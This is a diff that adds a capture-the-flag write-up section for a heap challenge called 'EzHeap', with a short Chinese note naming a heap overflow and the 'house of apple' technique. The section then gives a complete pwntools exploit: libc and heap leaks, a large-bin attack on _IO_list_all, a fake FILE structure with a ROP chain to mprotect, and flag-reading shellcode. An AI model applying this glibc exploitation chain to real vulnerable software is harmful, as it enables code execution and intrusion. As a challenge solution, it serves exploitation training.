@@ -1552,6 +1552,123 @@ p.interactive()
 ```
 
 ## EzHeap
+### 分析
+有堆溢出漏洞，正常打house of apple
+
+### exp
+```python
+from pwn import *
+
+p = process("./EzHeap")
+
+#context.terminal = ['tmux', 'splitw', '-h']
+context.log_level = 'debug'
+context.arch = 'amd64'
+
+elf = ELF("./EzHeap")
+libc = ELF("./libc.so.6")
+
+def add(size,content):
+    p.sendlineafter(b"choice >> ",b'1')
+    p.sendlineafter(b"size:",str(size).encode())
+    p.sendafter(b"content:",content)
+
+def delete(idx):
+    p.sendlineafter(b"choice >> ",b'2')
+    p.sendlineafter(b"idx:",str(idx).encode())
+
+def edit(idx,size,content):
+    p.sendlineafter(b"choice >> ",b'3')
+    p.sendlineafter(b"idx:",str(idx).encode())
+    p.sendlineafter(b"size:",str(size).encode())
+    p.sendafter(b"content:",content)
+
+def show(idx):
+    p.sendlineafter(b"choice >> ",b'4')
+    p.sendlineafter(b"idx:",str(idx).encode())
+
+def Exit():
+    p.sendlineafter(b"choice >> ",b'5')
+
+add(0x200,b'a') # 0
+add(0x490,b'a') # 1
+add(0x1a0,b'a') # 2
+add(0x480,b'b') # 3
+add(0x500,b'c') # 4
+delete(1)
+add(0x500,b'g') # 1
+delete(3)
+
+edit(0,0x300,b'a'*0x200 + b'b'*0x10)
+show(0)
+p.recvuntil(b'b'*0x10)
+libc_addr = u64(p.recv(6).ljust(8,b'\x00'))
+libc_base = libc_addr - 0x21b0f0
+log.success("libc_base ==>> " + hex(libc_base))
+
+edit(0,0x300,b'a'*0x200 + b'b'*0x20)
+show(0)
+p.recvuntil(b'b'*0x20)
+heap_addr = u64(p.recv(6).ljust(8,b'\x00'))
+heap_base = heap_addr - 0x002510
+log.success("heap_base ==>> " + hex(heap_base))
+
+edit(0,0x300,b'a'*0x200 + p64(0) + p64(0x4a1) + p64(libc_addr)*2 + p64(heap_addr) + p64(libc_base + libc.sym['_IO_list_all'] - 0x20))
+add(0x500,b'g') # 5
+
+fake_IO_FILE = heap_base + 0x002b60
+shellcode = b'hflagH\x89\xe71\xf6j\x02X\x0f\x05H\x89\xc7H\x89\xe6\xba\x00\x01\x00\x001\xc0\x0f\x05\xbf\x01\x00\x00\x00H\x89\xe6j\x01X\x0f\x05'
+
+f = flat({
+    0x28: 1, # _IO_write_ptr
+    0x38: fake_IO_FILE + 0x280, # _IO_buf_base
+    0xa0: fake_IO_FILE + 0xe0, # _wide_data
+    0xd8: libc_base + 0x2170c0, #_vtables
+    }, filler = b'\x00')
+
+data = bytes(f).ljust(0xe0, b"\x00")
+
+data += b"\x00" * 0xe0
+data += p64(fake_IO_FILE + 0x200)
+data = data.ljust(0x200, b"\x00")
+
+data += b"\x00" * 0x68
+data += p64(libc_base + 0x15d48a)   
+data = data.ljust(0x280, b"\x00")
+
+data += p64(fake_IO_FILE + 0x2a0)
+data += p64(0)
+data += p64(libc_base + 0x162f64)
+data = data.ljust(0x2a0, b"\x00")
+
+data += p64(0)
+data += p64(fake_IO_FILE + 0x2e0)
+data += p64(libc_base + 0x167420) + b"\x00"*0x20
+data += p64(fake_IO_FILE + 0x2a0)
+data = data.ljust(0x2e0, b"\x00")
+
+data += p64(libc_base + 0xd2ba5)+0x18*b"\x00"
+data += p64(libc_base + 0x5a120)+0x8*b"\x00" # mov_rsp_rdx
+
+data += p64(libc_base + 0x2a3e5) # pop_rdi
+data += p64(heap_base)
+data += p64(libc_base + 0x2be51) # pop_rsi
+data += p64(0x10000)
+data += p64(libc_base + 0x904a9) # pop_rdx_rbx
+data += p64(7)
+data += p64(0)
+data += p64(libc_base + libc.sym['mprotect'])
+data += p64(heap_base + 0x3000)
+
+data = data.ljust(0x360,b'\x00')
+edit(2,0x500,b'a'*0x1a0+data)
+edit(4,0x100,shellcode)
+
+Exit()
+
+p.interactive()
+
+```
 
 ## SuperHeap
 
